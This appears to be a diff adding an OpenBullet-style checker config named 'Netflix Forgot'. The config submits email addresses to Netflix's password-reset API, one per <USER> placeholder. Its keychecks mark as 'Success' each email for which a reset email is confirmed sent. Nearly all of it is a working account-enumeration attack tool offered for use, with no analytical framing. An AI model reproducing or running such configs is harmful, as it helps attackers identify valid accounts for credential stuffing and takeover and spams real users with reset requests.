@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Netflix Forgot ",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-02T00:24:01.917961+00:00",
+  "AdditionalInfo": "",
+  "Author": "Kermit",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.netflix.com/api/shakti/vc2328289/login/help" AutoRedirect=TRUE 
+  CONTENT "{\"fields\":{\"forgotPasswordChoice\":{\"value\":\"email\"},\"email\":\"<USER>\"},\"mode\":\"enterPasswordReset\",\"action\":\"nextAction\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Referer: https://www.netflix.com/LoginHelp" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "enterPasswordReset\",\"" 
+  KEYCHAIN Success OR 
+    KEY "confirmPasswordResetEmailed" 
